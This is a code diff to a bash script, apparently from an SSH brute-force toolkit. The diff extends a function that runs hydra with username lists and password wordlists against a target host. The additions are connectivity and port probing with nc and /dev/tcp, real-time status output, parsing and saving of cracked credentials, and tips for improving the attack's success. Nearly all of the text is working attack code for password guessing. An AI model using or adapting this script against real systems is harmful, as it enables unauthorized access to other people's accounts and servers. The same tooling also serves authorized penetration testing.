@@ -138,63 +138,125 @@ run_attack() {
         exit 1
     fi
     
-    print_header "Starting SSH Attack"
+    # Real-time status: Starting
+    realtime_status "starting" "SSH attack on $TARGET:$PORT"
+    
+    print_header "Starting SSH Attack - OPTIMIZED MODE"
     log_info "Target: $TARGET:$PORT"
     log_info "Username list: $username_file"
-    log_info "Threads: $THREADS"
-    log_info "Timeout: ${TIMEOUT}s"
+    log_info "Threads: $THREADS (OPTIMIZED)"
+    log_info "Timeout: ${TIMEOUT}s (OPTIMIZED)"
     echo ""
+    
+    # Real-time status: Running
+    realtime_status "running" "Checking target connectivity..."
+    
+    # Pre-flight checks with real-time feedback
+    if ! ping -c 1 -W 2 "$TARGET" &>/dev/null; then
+        realtime_status "warning" "Target may be offline or blocking ICMP"
+    else
+        realtime_status "success" "Target is reachable"
+    fi
+    
+    # Check if SSH port is open
+    realtime_status "running" "Verifying SSH service on port $PORT..."
+    if nc -z -w 5 "$TARGET" "$PORT" 2>/dev/null || timeout 5 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null; then
+        realtime_status "success" "SSH port $PORT is open"
+    else
+        realtime_status "failure" "SSH port $PORT appears closed or filtered"
+        diagnose_failure "ssh" "1" "Connection refused or port closed" "$TARGET" "$PORT"
+        return 1
+    fi
     
     local total_wordlists=${#wordlists[@]}
     local current_wordlist=0
+    local found_credentials=0
     
     for wordlist in "${wordlists[@]}"; do
         current_wordlist=$((current_wordlist + 1))
         local wordlist_name=$(basename "$wordlist")
         
+        realtime_status "progress" "Wordlist $current_wordlist/$total_wordlists: $wordlist_name"
         print_header "Wordlist $current_wordlist/$total_wordlists: $wordlist_name"
         
         if [ ! -f "$wordlist" ]; then
+            realtime_status "warning" "Wordlist not found: $wordlist"
             log_warning "Wordlist not found: $wordlist"
             continue
         fi
         
         local word_count=$(wc -l < "$wordlist")
+        realtime_status "running" "Testing $word_count passwords with $THREADS threads..."
         log_info "Testing $word_count passwords..."
         
-        # Run hydra
+        # Run hydra with enhanced error capture
         local output_file=$(mktemp)
+        local error_file=$(mktemp)
+        
+        realtime_status "running" "Hydra attack initiated - watch for real-time results..."
+        
         hydra -L "$username_file" -P "$wordlist" \
               -t $THREADS \
               -w $TIMEOUT \
               -o "$output_file" \
               -f \
-              ssh://$TARGET:$PORT 2>&1 | while IFS= read -r line; do
+              ssh://$TARGET:$PORT 2>"$error_file" | while IFS= read -r line; do
+            
+            # Real-time progress feedback
+            if [[ $line == *"[ATTEMPT]"* ]] || [[ $line == *"[STATUS]"* ]]; then
+                [ "$VERBOSE" = "true" ] && realtime_status "progress" "$line"
+            fi
             
             if [[ $line == *"host:"* ]] && [[ $line == *"login:"* ]] && [[ $line == *"password:"* ]]; then
                 # Parse successful login (support credentials with spaces)
                 local login=$(echo "$line" | sed -n 's/.*login: \(.*\) password:.*/\1/p')
                 local password=$(echo "$line" | sed -n 's/.*password: \(.*\)/\1/p')
                 
+                realtime_status "success" "CREDENTIALS FOUND: $login:$password"
                 save_result "ssh" "$TARGET" "$login" "$password" "$PORT"
                 log_success "Valid credentials found: $login:$password"
                 
                 # Save to resume file
-                echo "SUCCESS: $login:$password" >> "$RESUME_FILE"
+                echo "SUCCESS: $login:$password @ $(date)" >> "$RESUME_FILE"
                 
+                rm -f "$output_file" "$error_file"
                 return 0
             fi
             
             [ "$VERBOSE" = "true" ] && echo "$line"
         done
         
-        if [ $? -eq 0 ]; then
+        # Check exit status and error output
+        local exit_code=$?
+        local error_output=$(cat "$error_file" 2>/dev/null)
+        
+        if [ $exit_code -eq 0 ] && [ -s "$output_file" ]; then
+            realtime_status "success" "Attack completed successfully"
             log_success "Attack successful! Check logs for credentials."
+            rm -f "$output_file" "$error_file"
             return 0
+        elif [ $exit_code -ne 0 ] && [ -n "$error_output" ]; then
+            # Attack failed with errors - diagnose
+            realtime_status "failure" "Attack encountered errors"
+            diagnose_failure "ssh" "$exit_code" "$error_output" "$TARGET" "$PORT"
         fi
+        
+        rm -f "$output_file" "$error_file"
     done
     
+    realtime_status "failure" "No valid credentials found after trying all wordlists"
     log_warning "No valid credentials found"
+    
+    # Provide helpful suggestions
+    echo ""
+    print_message "💡 SUGGESTIONS TO IMPROVE SUCCESS:" "$CYAN"
+    echo "  • Try different wordlists: bash scripts/download_wordlists.sh"
+    echo "  • Generate custom wordlist: bash scripts/wordlist_generator.sh"
+    echo "  • View SSH optimization tips: bash scripts/ssh_admin_attack.sh --tips"
+    echo "  • Check if target uses key-only authentication"
+    echo "  • Verify usernames exist on target system"
+    echo ""
+    
     return 1
 }
 
